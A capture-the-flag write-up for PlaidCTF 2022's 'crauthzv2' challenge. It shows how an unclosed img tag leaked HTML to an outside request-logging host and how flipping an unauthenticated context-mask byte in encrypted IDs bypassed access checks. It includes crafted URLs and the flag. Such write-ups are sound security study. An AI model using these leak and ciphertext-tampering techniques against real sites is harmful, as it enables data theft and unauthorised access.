# PlaidCTF 2022: crauthzv2

Participant: Dosenpfand

## TL;DR / Short Summary

A web and crypto CTF challenge that requires exploitation multiple vulnerabilities: Missing user input sanitation, missing permission checks, and the malleability of a ciphertext.

## Disclaimer
We did not solve the challenge during the course of PlaidCTF. After the CTF was over an ["intended solve approach"](https://gist.github.com/mserrano/44031a01afb53f98536af17f6ba9eedd), as well as [parts of the source code](https://gist.github.com/mserrano/ca19c75f977f71cb8dc267417b5e60b0) was published on GitHub by `mserrano`, presumably the author of the challenge. The sections [Analysis Steps](#analysis-steps), [Vulnerabilities / Exploitable Issues](#vulnerabilities--exploitable-issues), [Solution](#solution) and [Lessons Learned](#lessons-learned) are based on knowledge gained from these two documents.

## Task Description

The challenged is called `crauthzv2` and is tagged with `web` and `crypto`. A link to <http://crauthz.chal.pwni.ng/> as well as the following description is provided as part of this task:

> The Plaidiverse has to be secure, even the old-web versions of it. But doing security is hard. Permissions checks especially so. What if we used cryptography to do our permissions checks instead? Hint: What control do you have over the values pointed to by the mask?

By following the link we reach a job board where we can register an account. Afterwards we are logged in and can see a single job posting that reads as follows:

> Think you have what it takes to make THE GAUNTLET better? Share your resume on THE GAUNTLET with "jobs" for consideration. We'll scrape any images in your resume; make sure to include some screenshots of your Github profile.

Only the remote instance is available as part of the CTF, there is no source code supplied.

## Analysis Steps

We register an account and notice the ridiculous password complexity policy. After a quick research, we discover that this seems to be [best practice](https://twitter.com/tylerni7/status/1493651268312522752) for web challenges. It prevents account takeovers of teams that already solved the challenge and used weak user/password combinations.

We see that the job posting mentioned in [Task Description](#task-description) was created by the user `jobs` with the `user_id` `2`.

### CRID

By looking around the site, we notice that all URLs contain parameters starting with `crid:`, e.g. `http://crauthz.chal.pwni.ng/view?id=crid%3ABZLBNnxQ92%2BcAS1SHrCQ5a86EJTMHkTRUIroXYWk080r`.

These IDs change on every refresh of the page, even for the same resource. We recognize the following pattern across all IDs: `"url_encode(crid:" + base64_encode(data))` with the first byte of `data` always being either `5` or `7`.

When we modify a URL with a `crid` starting with `5` we get an error message similar to:

> Error: Invalid ID (with parsed mask ['user_id', 'purpose']) for user id "1158", csrf "f447f3c65b49aa05957aca523c1e1828", purpose "view"

For IDs starting with `7` the message is:

> Error: Invalid ID (with parsed mask ['user_id', 'csrf', 'purpose']) for user id "1158", csrf "6ab1b52796d641d3ccf34b5730dc50e2", purpose "create_comment"

By looking at the back-end source code, which was not available during the CTF, we can see that the first byte of the `crid` is a `context_mask` and the encrypted `id` follows later.

```
+--------------+
| "crid:"      |
+--------------+---\
| context_mask |   |
+--------------+   |
| nonce        |   |
+--------------+   + base64 encoded
| encrypt(id)  |   |
+--------------+   |
| tag          |   |
+--------------+---/
```

The `context_mask`, is a bit field that indicates which associated data is included in the `crid`.

```
+---------+---------+------+---------+
| 7 ... 3 | 2       | 1    | 0       |
+---------+---------+------+---------+
| X       | PURPOSE | CSRF | USER_ID |
+---------+---------+------+---------+
```

While the data indicated by the `context_mask` is included in the associated data of the AEAD encryption, the `context_mask` itself is not.

```
+---------+
| "id"    |
+---------+---\
| user_id |   |
+---------+   |
| csrf    |   + depending on context mask
+---------+   |
| route   |   |
+---------+---/
```

A `crid` can therefore be manipulated by changing its `context_mask` and adapting the `csrf` cookie that is being sent accordingly.

### Image Sharing

By following the instruction from the job posting

> Share your resume on THE GAUNTLET with "jobs" for consideration. We'll scrape any images in your resume;

We create a resume containing an HTML image tag:

```
<img src="http://requestbin.net/r/5vn3gc7l">
```

After sharing it with the user `jobs` we see that the URL gets requested.

If we do not properly close the attribute and tag:
```
<img src="http://requestbin.net/r/5vn3gc7l?q=
```
We can retrieve some HTML succeeding our broken `img` tag by looking at the requested URL.

```
<b>Internal listing - security engineer</b> (Job) by jobs <a href=/p/unpin_listing?listing_id=crid:Bc6Rl57Y3nU9CbKqnfoCruNP074GbEkkb0RapF1tmQ==&ret=crid:BwK08K/aJC4FC+b5LbL9eAi/47baWgNCkVU7uijNPSj0>Unpin</
```

It seems that there is another job listing, which is not public.

## Vulnerabilities / Exploitable Issues

Multiple vulnerabilities can be chained to exploit the web application:
1. The HTML code that can be input by the user is not checked for validity or at least sanity, making it vulnerable to exposure of sensitive information.
2. The application mostly relies on the `crid` verification for access control instead of applying permission verification explicitly.
3. The `crid` parameters do not include the `context_mask` in the associated data when performing AEAD encryption, therefore making it vulnerable to a malleability attack.

## Solution

We share a resume with a unclosed `img` tag with the `jobs` user. From the requested URL we then `unpin` URL of the internal job listing:

```
/p/unpin_listing?listing_id=crid:Bc6Rl57Y3nU9CbKqnfoCruNP074GbEkkb0RapF1tmQ==&ret=crid:BwK08K/aJC4FC+b5LbL9eAi/47baWgNCkVU7uijNPSj0
```

We take the `crid` of the `listing_id`, modify its first byte from `5 = (USER_ID | PURPOSE)` to `6 = (CSRF | PURPOSE)`, set our cookie to `csrf=2` (the `user_id` of the `jobs` user) and use it to pin the listing in our account:

```
p/pin_listing?listing_id=crid%3ABs6Rl57Y3nU9CbKqnfoCruNP074GbEkkb0RapF1tmQ%3D%3D
```

Unfortunately there are some permission checks in place after all, so we can not view the listing:

> Error: Not authorized to view listing!

But we now have a `unpin` `crid` that is tied to our `user_id`:

```
http://crauthz.chal.pwni.ng/p/unpin_listing?listing_id=crid%3ABRtQiQYTqY7s4i6I9Ci89ntIh4EffFGpMtcqqylsew%3D%3D&ret=crid%3AB0Z21uGx%2B4LHMgcqwn8BoXrkYlOAhDJ%2BKvz4BMd2
```

Similarly to the first modification, we change the first byte from `5 = (USER_ID | PURPOSE)` to `3 = (USER_ID | CSRF)`, set our cookie to `csrf=pin_listing` (pin and unpin actions both use the same `purpose`) and use it share the listing with our account:

```
http://crauthz.chal.pwni.ng/p/share_listing?id=crid%3AAxtQiQYTqY7s4i6I9Ci89ntIh4EffFGpMtcqqylsew%3D%3D&other=dpdpdp
```

Now we can view the listing and find the flag in the comments.

**Flag: `PCTF{wow_wh4t_a_vib3_sh1ft}`**

## Failed Attempts

During the course of the CTF we pursued different approaches, which turned out to be dead ends.

### Session Cookie

Additionally, to examine the `crid` parameter and its surrounding we spent a lot of time investigating the `session` cookie that is being set by the web application. An exemplary cookie is

```
.eJwljk1qAzEMRq8yaJ2FfyTZnjP0BiUE2ZIngWkL48yihNy9hq4e34MP3gtufZdxtwHr5wuW5wR82RiyGVzg42fbTJfH9zLO1qbu577_wvV9vczjYeMO6_M4ba6HwgqZiiWkrohRtISSG0fTxJEi91BrJifoXOTEpjWV6JwwhVpijeadKEazbMwoaNRyruokcZCYCNVaZ8TkMZTmtXmxSpVD016aIWWeybdz2PFf4z1leP8BPapDSg.YlFfAA.VjO2FxB_C4xRQQyS4pH0_FQq8iI
```

We thought it could be a botched alternative to JSON Web Token (JWT) and therefore be vulnerable. The part between the first two dots can be decoded by base64 decoding with the URL safe alphabet and then applying zlib inflation ([Cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',false)Zlib_Inflate(0,0,'Adaptive',false,false)JSON_Beautify('%20%20%20%20',false))). This way we get JSON encoded data, e.g.

```json
{
    "_flashes": [
        {
            " t": [
                "message",
                "Logged in successfully"
            ]
        }
    ],
    "_fresh": true,
    "_id": "859e745fd443ad9298c63ed763536f2bb850a4003676edb79300a652b93b3e10ad43ee8e664a4e5c88bd0a762a3754decf64471429c1dc1aeb5b62cdf9ce4586",
    "_user_id": "1158"
}
```

We assumed that the 2nd part between dots to be a timestamp, due to its monotonically increasing nature. We deduced that the third part after the last dot is some kind of signature, similar to the JWT scheme.

After a lot of research, we discovered that the cookie is an off-the-shelf session cookie from [Flask](https://flask.palletsprojects.com), a popular Python web framework. More precisely, Flask uses the `URLSafeTimedSerializer` from [ItsDangerous](https://itsdangerous.palletsprojects.com/en/2.1.x/url_safe/) in its [session management](https://github.com/pallets/flask/blob/2b0b77cc1acb7381e990b17c881cb426c9ac75f5/src/flask/sessions.py#L328).

This cookie format completely matched what we were observing. Therefore, we discarded our approach of finding a vulnerability in the session handling.

### Others

Additionally, to the methods explained so far, we tried standard attack vectors like XSS, CSRF and SQL injection.

While also JavaScript could be embedded in posted resumes and job listings, the CSP in the HTTP headers sent by the server did not allow its execution by a browser.

```
Content-Security-Policy: script-src 'none'; object-src 'none'; frame-ancestors 'self'; default-src 'none'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css; img-src *;
```

Furthermore, it is questionable if the remote client would even be able to execute JavaScript, as its user agent `python-requests/2.26.0` suggests that it is the Python [Requests library](https://docs.python-requests.org/). Therefore, we abandoned an XSS approach.

While the remote client also followed HTTP redirect, a CSRF attack was not deemed to be feasible because of the `csrf` cookie being sent and evidently being evaluated by the server.

Last we tried to embed SQL injection at different user controlled input - alas, to no avail.

## Lessons Learned

As this was the first CTF I participated in, naturally there was a lot to discover. From the challenge and its intended solution I learned about general topics like input sanitation, authenticated encryption with associated data and malleability and content Security policy. Moreover, experiencing the productive collaboration, but also the pressure while working on a challenge were a novelty. Lastly, I got a decent understanding of Flask and its session management.

## References
* [Intended solve approach](https://gist.github.com/mserrano/44031a01afb53f98536af17f6ba9eedd)
* [CRID back-end source code](https://gist.github.com/mserrano/ca19c75f977f71cb8dc267417b5e60b0)
* [ItsDangerous documentation](https://itsdangerous.palletsprojects.com/en/2.1.x/url_safe/)
* [Flask session management source code](https://github.com/pallets/flask/blob/2b0b77cc1acb7381e990b17c881cb426c9ac75f5/src/flask/sessions.py#L328)
